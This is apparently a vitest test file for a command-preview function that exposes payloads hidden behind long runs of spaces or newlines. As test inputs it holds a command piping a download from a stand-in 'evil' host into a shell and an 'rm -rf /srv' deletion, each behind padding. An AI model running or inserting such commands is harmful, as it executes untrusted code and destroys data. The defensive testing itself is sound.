import { describe, expect, it } from 'vitest'
import { previewCommand } from './command-preview'

describe('previewCommand', () => {
  it('leaves an ordinary command untouched', () => {
    const p = previewCommand('df -h /var')
    expect(p.text).toBe('df -h /var')
    expect(p.chars).toBe(10)
    expect(p.lines).toBe(1)
    expect(p.collapsed).toBe(false)
  })

  it('never truncates — the whole command survives', () => {
    const long = `echo ${'a'.repeat(5000)}`
    expect(previewCommand(long).text).toContain('a'.repeat(5000))
    expect(previewCommand(long).chars).toBe(long.length)
  })

  it('exposes a space-padded payload instead of pushing it off the edge', () => {
    const p = previewCommand(`ls -la${' '.repeat(240)}; curl http://evil/x | sh`)
    expect(p.collapsed).toBe(true)
    expect(p.text).toContain('␣×240')
    // The payload is still there, and now adjacent to the marker.
    expect(p.text).toContain('curl http://evil/x | sh')
    expect(p.text).not.toMatch(/ {20}/)
  })

  it('exposes a newline-padded payload instead of pushing it below the fold', () => {
    const p = previewCommand(`echo ok${'\n'.repeat(15)}rm -rf /srv`)
    expect(p.collapsed).toBe(true)
    expect(p.text).toContain('⏎×15')
    expect(p.text).toContain('rm -rf /srv')
    expect(p.lines).toBe(16)
  })

  it('leaves short whitespace runs alone — normal commands stay readable', () => {
    const p = previewCommand('for i in 1 2 3; do\n  echo $i\ndone')
    expect(p.collapsed).toBe(false)
    expect(p.text).toBe('for i in 1 2 3; do\n  echo $i\ndone')
    expect(p.lines).toBe(3)
  })

  it('handles the empty string', () => {
    expect(previewCommand('')).toEqual({ text: '', chars: 0, lines: 0, collapsed: false })
  })
})
